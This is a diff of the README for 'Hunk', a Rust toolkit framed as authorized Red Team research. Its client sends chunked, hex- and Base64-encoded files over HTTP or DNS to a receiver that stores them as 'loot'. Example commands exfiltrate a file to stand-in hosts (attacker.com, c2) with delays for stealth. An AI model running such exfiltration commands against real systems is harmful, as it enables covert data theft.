@@ -2,107 +2,73 @@
 
 ## Overview
 
-**Hunk** is a comprehensive Rust-based toolkit for researching and practicing data exfiltration techniques commonly used in Red Team engagements. The project is a Cargo workspace containing two specialized tools: **Runner** (client-side exfiltration agent) and **Shelter** (server-side receiver).
-
-This project emerged with two primary objectives in mind:
-
-1. **Practice Rust Programming** — Develop proficiency in Rust by building real-world security tools (with or without AI assistance)
-2. **Research Exfiltration Mechanisms** — Explore and understand various covert data exfiltration channels and encoding techniques used in offensive security operations
+Hunk is a small Cargo workspace implementing a client/server exfiltration research toolset. Its primary objective is twofold:
+- Provide a practical Rust learning project for networking, async, and systems programming.
+- Offer a controlled environment to study data exfiltration techniques used during authorized Red Team engagements (HTTP and DNS covert channels, chunking, and layered encoding).
 
 ## Project Structure
 
-```
-hunk/
-├── runner/          # Client-side exfiltration agent
-├── shelter/         # Server-side file receiver
-├── Cargo.toml       # Workspace configuration
-└── README.md        # This file
-```
+hunk is organized as a workspace with two focused crates:
 
-### Runner
+- `runner/` — client-side agent that encodes and transmits file chunks
+- `shelter/` — server-side receiver that decodes, assembles, and persists files
+- `Cargo.toml` — workspace manifest
+- `README.md` — this file (root)
 
-**Runner** is a command-line tool that exfiltrates files from a compromised system using multiple covert channels:
+### Runner (brief)
 
-- **HTTP Exfiltration** — Send encoded file chunks via HTTP POST requests
-- **DNS Tunneling** — Exfiltrate data through DNS TXT queries (includes TCP/UDP support)
-- **Configurable Encoding** — Base64 + hex encoding for payload obfuscation
-- **Chunk-based Transfer** — Split files into configurable chunks with inter-packet delays for stealth
+Runner is a CLI agent that:
+- Reads files, encodes them (Base64 → hex) and splits them into chunks
+- Transmits chunks over HTTP POST or as DNS TXT subdomain queries (UDP/TCP)
+- Supports configurable chunk counts and inter-chunk delays for operational stealth
 
-**Quick Start:**
-```bash
-cargo run --release -p runner -- exfil http \
-  --src-files /path/to/file.txt \
-  -u https://attacker.com/receive \
-  --chunks 10 \
-  --delay 500
-```
+Example (HTTP):
+cargo run --release -p runner -- exfil http --src-files /path/to/file.txt -u https://c2/receive --chunks 10 --delay 500
 
-See `runner/README.md` for detailed documentation.
+See `runner/README.md` for full usage and options.
 
-### Shelter
+### Shelter (brief)
 
-**Shelter** is a server-side receiver that accepts exfiltrated file portions from Runner and reconstructs them on disk:
+Shelter is a receiver that:
+- Listens as an HTTP server (POST body payloads) or DNS authoritative server (subdomain payloads)
+- Decodes payloads (hex → Base64 → UTF-8), indexes chunks in-memory, and reassembles files when the final chunk arrives
+- Persists reconstructed files to a configurable `loot` directory
 
-- **HTTP Server** — Listen for POST requests containing encoded file portions
-- **In-Memory Assembly** — Accumulate and reorder file chunks using deterministic ordering
-- **Asynchronous Processing** — Non-blocking file reconstruction and disk persistence
-- **Error Resilience** — Graceful handling of malformed payloads with comprehensive logging
+Example (HTTP):
+cargo run --release -p shelter -- http-server -l 0.0.0.0:8080 --output-dir ./loot
 
-**Quick Start:**
-```bash
-cargo run --release -p shelter -- http-server \
-  -l 0.0.0.0:8080 \
-  --output-dir ./loot
-```
-
-See `shelter/README.md` for detailed documentation.
+See `shelter/README.md` for detailed configuration and deployment options (including Docker).
 
 ## End-to-End Workflow
 
-```
-┌──────────────────────┐
-│  Compromised System  │
-│  (Runner Agent)      │
-└──────────────┬───────┘
-               │ Encodes & sends file chunks
-               ▼
-        HTTP/DNS Channel
-               │
-               ▼
-┌──────────────────────┐
-│  Attacker Server     │
-│  (Shelter Receiver)  │
-└──────────────┬───────┘
-               │ Assembles & reconstructs
-               ▼
-         Loot Directory
-      (Exfiltrated Files)
-```
+1. Runner builds a root node (metadata) and file chunk nodes, encodes each node (Base64 → hex).
+2. Runner sends encoded nodes over HTTP POST or as DNS query subdomains to Shelter.
+3. Shelter decodes incoming nodes, enqueues them, and stores chunks in a sorted in-memory structure.
+4. When an end marker is received, Shelter assembles, hex-decodes, concatenates bytes, and writes the file to the loot directory.
+
+Diagram:
+Compromised System (Runner) → HTTP/DNS → Shelter (Receiver) → Loot Directory
 
 ## Building the Project
 
 ### Prerequisites
-- Rust 1.70+ (install from [rustup.rs](https://rustup.rs/))
-- Cargo (included with Rust)
+- Rust toolchain (rustup) — Rust 1.70+ recommended
+- Standard build toolchain for your OS (C toolchain/linker present; e.g., build-essential, Xcode CLI tools)
 
-### Build All Components
-```bash
-# Build both Runner and Shelter in release mode
+### Build instructions
+Build all workspace binaries:
 cargo build --release
+Binaries: `target/release/runner`, `target/release/shelter`
 
-# Binaries available at:
-# - target/release/runner
-# - target/release/shelter
-```
-
-### Build Specific Component
-```bash
-# Build only Runner
+Build a single package:
+# Runner only
 cargo build --release -p runner
 
-# Build only Shelter
+# Shelter only
 cargo build --release -p shelter
-```
+
+For development runs, use `cargo run --` with the component command (see examples above or the component README files).
+
 
 ## Operational Model
 
